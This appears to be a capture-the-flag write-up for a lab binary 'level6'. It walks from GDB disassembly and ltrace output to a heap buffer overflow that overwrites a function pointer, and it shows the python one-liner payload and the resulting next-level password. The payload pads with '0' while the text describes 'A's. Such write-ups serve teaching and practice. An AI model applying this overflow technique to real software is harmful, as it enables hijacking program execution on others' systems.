# Analysis of the Binary

Start by inspecting the functions in the program using GDB:

```bash
(gdb) info functions
[...]
0x08048454  n
0x08048468  m
0x0804847c  main
[...]
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804847c <+0>:     push   %ebp
   0x0804847d <+1>:     mov    %esp,%ebp
   0x0804847f <+3>:     and    $0xfffffff0,%esp
   0x08048482 <+6>:     sub    $0x20,%esp
   0x08048485 <+9>:     movl   $0x40,(%esp)
   0x0804848c <+16>:    call   0x8048350 <malloc@plt>
   0x08048491 <+21>:    mov    %eax,0x1c(%esp)
   0x08048495 <+25>:    movl   $0x4,(%esp)
   0x0804849c <+32>:    call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:    mov    %eax,0x18(%esp)
   0x080484a5 <+41>:    mov    $0x8048468,%edx
   0x080484aa <+46>:    mov    0x18(%esp),%eax
   0x080484ae <+50>:    mov    %edx,(%eax)
   0x080484b0 <+52>:    mov    0xc(%ebp),%eax
   0x080484b3 <+55>:    add    $0x4,%eax
   0x080484b6 <+58>:    mov    (%eax),%eax
   0x080484b8 <+60>:    mov    %eax,%edx
   0x080484ba <+62>:    mov    0x1c(%esp),%eax
   0x080484be <+66>:    mov    %edx,0x4(%esp)
   0x080484c2 <+70>:    mov    %eax,(%esp)
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:    mov    0x18(%esp),%eax
   0x080484ce <+82>:    mov    (%eax),%eax
   0x080484d0 <+84>:    call   *%eax
   0x080484d2 <+86>:    leave
   0x080484d3 <+87>:    ret
End of assembler dump.
(gdb) disassemble m
Dump of assembler code for function m:
   0x08048468 <+0>:     push   %ebp
   0x08048469 <+1>:     mov    %esp,%ebp
   0x0804846b <+3>:     sub    $0x18,%esp
   0x0804846e <+6>:     movl   $0x80485d1,(%esp)
   0x08048475 <+13>:    call   0x8048360 <puts@plt>
   0x0804847a <+18>:    leave
   0x0804847b <+19>:    ret
End of assembler dump.
(gdb) disassemble n
Dump of assembler code for function n:
   0x08048454 <+0>:     push   %ebp
   0x08048455 <+1>:     mov    %esp,%ebp
   0x08048457 <+3>:     sub    $0x18,%esp
   0x0804845a <+6>:     movl   $0x80485b0,(%esp)
   0x08048461 <+13>:    call   0x8048370 <system@plt>
   0x08048466 <+18>:    leave
   0x08048467 <+19>:    ret
End of assembler dump.
(gdb) x/s 0x80485b0
0x80485b0:       "/bin/cat /home/user/level7/.pass"
```

## Key Observations
- In `main`, two memory blocks are allocated. One block stores a function pointer, initially set to `m`, and is called later in the code.
- A `strcpy` call in `main` copies user input into the first block, which could potentially lead to a buffer overflow.
- The `n` function, when executed, reveals the desired password.

# Developing the Exploit

Our objective is to overflow the buffer in `main` to alter the function pointer from `m` to `n`.

## Determining the Buffer Overflow Size with ltrace

Use `ltrace` to understand the memory allocations and calculate the size needed for the overflow:

```bash
$ ltrace ./level6 test
__libc_start_main(0x804847c, 2, 0xbffff7e4, 0x80484e0, 0x8048550 <unfinished ...>
malloc(64)                                                                                      = 0x0804a008
malloc(4)                                                                                       = 0x0804a050
[...]
```

Based on the addresses returned by `malloc`, we calculate the overflow size:
- Address of first block: `0x0804a008`
- Address of function pointer block: `0x0804a050`
- Required overflow size: `0x0804a050 - 0x0804a008 = 0x48` (72 in decimal)

## Constructing the Payload

Formulate a payload that overflows the first memory block and overwrites the function pointer:

```bash
$ ./level6 `python -c 'print("0"*72 + "\x08\x04\x84\x54"[::-1])'`
```

This command does the following:
- Fills the first memory block with 72 'A's (`"A"*72`).
- Overwrites the function pointer with the address of `n` (`"\x54\x84\x04\x08"` in little-endian format).

## Executing the Exploit

Running the exploit changes the function call from `m` to `n`, thereby revealing the password:

```plaintext
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

The exploit successfully diverts the execution flow and accesses the next level's password.
